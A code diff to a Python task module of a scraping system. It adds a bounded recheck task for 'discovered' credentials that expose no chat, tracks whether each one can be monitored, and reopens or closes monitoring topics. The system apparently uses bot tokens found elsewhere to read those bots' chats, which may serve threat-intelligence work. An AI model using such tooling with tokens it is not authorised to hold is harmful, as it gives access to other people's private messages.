@@ -1,6 +1,7 @@
 """Scrape flow task definitions."""
 
 import hashlib
+from datetime import datetime
 
 from .common import *
 
@@ -520,6 +521,8 @@ async def _persist_scrape_classification(cred_id: str, scrape_result: Any) -> No
         }
 
     meta_patch["last_scrape_at"] = datetime.now(UTC).isoformat()
+    if meta_patch.get("last_scrape_reason") in ("success", "no_new_messages"):
+        meta_patch["last_polled_at"] = meta_patch["last_scrape_at"]
     await _merge_credential_meta(cred_id, meta_patch)
 
     reason = meta_patch.get("last_scrape_reason")
@@ -801,6 +804,31 @@ def enrich_credential(cred_id: str):
     from app.workers.celery_app import get_worker_loop
     return get_worker_loop().run_until_complete(_enrich_logic(cred_id))
 
+
+@app.task(name="flow.recheck_unmonitorable_credentials")
+def recheck_unmonitorable_credentials(limit: int = 20):
+    """Bounded recheck of valid active credentials that currently expose no chat."""
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(_recheck_unmonitorable_credentials(limit))
+
+
+async def _recheck_unmonitorable_credentials(limit: int = 20) -> dict[str, int]:
+    limit = max(1, min(int(limit or 20), 100))
+    response = await async_execute(
+        db.table("discovered_credentials")
+        .select("id")
+        .eq("status", "active")
+        .is_("chat_id", "null")
+        .limit(limit)
+    )
+    rows = response.data or []
+    checked = 0
+    for row in rows:
+        await _enrich_logic(row["id"])
+        checked += 1
+    return {"checked": checked}
+
 async def _enrich_logic(cred_id: str):
     logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
 
@@ -817,7 +845,7 @@ async def _enrich_logic(cred_id: str):
     broadcaster = get_broadcaster()
     await broadcaster.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
     # Fetch credential
-    response = await async_execute(db.table("discovered_credentials").select("bot_token").eq("id", cred_id))
+    response = await async_execute(db.table("discovered_credentials").select("bot_token, meta").eq("id", cred_id))
     if not response.data:
         logger.error(f"❌ [Enrich] Credential {cred_id} not found.")
         return f"Credential {cred_id} not found."
@@ -875,8 +903,19 @@ async def _enrich_logic(cred_id: str):
     if not real_chats:
         # Valid token, but no open dialogs (or only bot_self placeholder).
         logger.info("    [Enrich] No real chats via API. Skipping Orphan Match (Disabled).")
-        # Mark as 'active' - token works but truly no chats accessible
-        await async_execute(db.table("discovered_credentials").update({"status": "active"}).eq("id", cred_id))
+        # The token is valid; lack of a chat is monitorability, not revocation.
+        meta = dict(record.get("meta") or {})
+        now_iso = datetime.now(UTC).isoformat()
+        meta["monitorability"] = "unmonitorable"
+        meta.setdefault("first_unmonitorable_at", now_iso)
+        meta["last_recheck_at"] = now_iso
+        meta["unmonitorable_reason"] = "no_accessible_chat"
+        await async_execute(
+            db.table("discovered_credentials").update({"status": "active", "meta": meta}).eq("id", cred_id)
+        )
+        from app.services.topic_admin_srv import close_unmonitorable_topic
+
+        await close_unmonitorable_topic(cred_id)
         return "Token valid, but no real chats found. Status updated to 'active'."
 
     chats = real_chats
@@ -932,13 +971,24 @@ async def _enrich_logic(cred_id: str):
         "enriched": True,
         "bot_username": bot_username,
         "bot_id": bot_id,
+        "monitorability": "monitorable",
+        "last_recheck_at": datetime.now(UTC).isoformat(),
     })
     if topic_id:
         meta_payload["topic_id"] = topic_id
+    meta_payload.pop("first_unmonitorable_at", None)
+    meta_payload.pop("unmonitorable_reason", None)
     meta_payload["capabilities"] = capabilities
+
+    if meta_payload.get("topic_closed_at") and topic_id:
+        if await broadcaster.reopen_topic(settings.MONITOR_GROUP_ID, topic_id):
+            meta_payload.pop("topic_closed_at", None)
+            meta_payload.pop("topic_closed_reason", None)
+            meta_payload["topic_status"] = "open"
 
     await async_execute(db.table("discovered_credentials").update({
         "chat_id": first_chat["id"],
+        "status": "active",
         "meta": meta_payload,
     }).eq("id", cred_id))
 
